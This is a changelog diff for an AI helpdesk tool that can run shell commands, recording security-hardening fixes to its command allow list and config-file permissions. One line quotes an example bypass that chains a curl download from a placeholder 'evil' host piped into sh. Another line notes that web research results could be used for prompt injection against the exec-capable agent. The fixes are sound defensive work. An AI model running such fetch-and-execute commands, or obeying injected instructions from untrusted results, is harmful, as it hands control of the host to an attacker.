@@ -1,5 +1,58 @@
 # Changelog
 
+## v1.1.1 (2026-08-25) — security hardening (audit follow-up)
+
+**Fixes for weaknesses found in a usability/function/security review of
+Help > AI Helpdesk, System > CS Tools Download, System > Services > AI
+Helpdesk and the AIHelp popup.**
+
+- **`exec_access=exec` (D2) now rejects shell metacharacters** (`; & | \` $( `)
+  outright — previously the allow list only matched the first word/prefix of
+  the proposed command (e.g. `zfs`), so a command like
+  `zfs list; curl http://evil/x.sh | sh` passed both the allow check (prefix
+  `zfs`) and the deny check (no denied substring), letting a chained,
+  unreviewed second command ride along on an approved class. `exec_access=exec`
+  is now strictly single-command; use `exec_access=console` (arbitrary shell,
+  deny-only, fully-trusted admins only) when chaining is genuinely required.
+  (`aihelplib.pl` `ai_exec_validate`)
+- **Allow-list prefix matching now requires a word boundary** — `zfs` in
+  `exec_allow` could previously match `zfsdestroy`-style typosquats via plain
+  `index($cmd,$a)==0`; now the character right after the matched prefix must
+  be whitespace or end-of-string. (`aihelplib.pl` `ai_exec_validate`)
+- **Config file permission hardening on Windows**: `_cfg/cs-aihelp` (holds
+  `api_key`/`api_key2`/`auth_token`) previously only got `chmod 0600` on
+  Unix (`_ai_chmod0600` was a no-op on `MSWin32`). Both the Perl config
+  writer and the Go daemon's `Config.Save()` now additionally lock the file
+  down via `icacls` on Windows (inheritance disabled, access limited to the
+  running account + built-in Administrators `S-1-5-32-544`) — best-effort,
+  non-fatal if `icacls` is unavailable. (`aihelplib.pl` `_ai_chmod0600`,
+  `go/config.go` `lockdownConfigFile`)
+- **`cs-aihelp start` now mirrors `serve`'s auth_token refusal**: starting the
+  daemon detached on a non-loopback `listen` address without `auth_token`
+  previously only failed silently inside the detached process (the caller —
+  Settings UI Start button, boot autostart — saw no error). `startCmd` now
+  performs the same check up front and exits with a clear stderr message.
+  (`go/cmd.go` `startCmd`)
+- **Settings page warns when `exec_access != ro` and `research != off` are
+  both active** — web research results reach the model as untrusted DATA;
+  combined with exec capability this widens the prompt-injection blast
+  radius, especially with `exec_mode=auto` (no human confirmation). New
+  warning banner on System > Services > AI Helpdesk.
+  (`10_System/05_Services/12_AI_Helpdesk/action.pl`)
+- **Documentation**: `ai-helpdesk.info` SECURITY MODEL section now documents
+  the D2 metacharacter rejection, the exec+research warning, the known SSRF
+  guard limitation (literal-IP check only, no DNS-rebinding protection —
+  `endpoint`/`research_endpoint` are admin-only trusted settings, not a hard
+  guarantee against a malicious hostname), and the Windows config-file ACL
+  hardening.
+- No functional/behavioral change for the default configuration
+  (`exec_access=ro`, `research=ddg`) — these fixes only change behavior once
+  `exec_access` is raised above `ro`.
+- Tests: Go `go vet` + `go test ./...` green after the `config.go`/`cmd.go`
+  changes (verified in CI sandbox); Perl `aihelplib.pl` syntax-checked
+  (`perl -c`, OK) — full Perl functional suite / PowerShell E2E not
+  re-executed as part of this pass.
+
 ## dev (2026-08-24) - Helpdesk UI + i18n refinement (host-side)
 
 **Per-question provider + mode choice, mini popup, translated field list.**
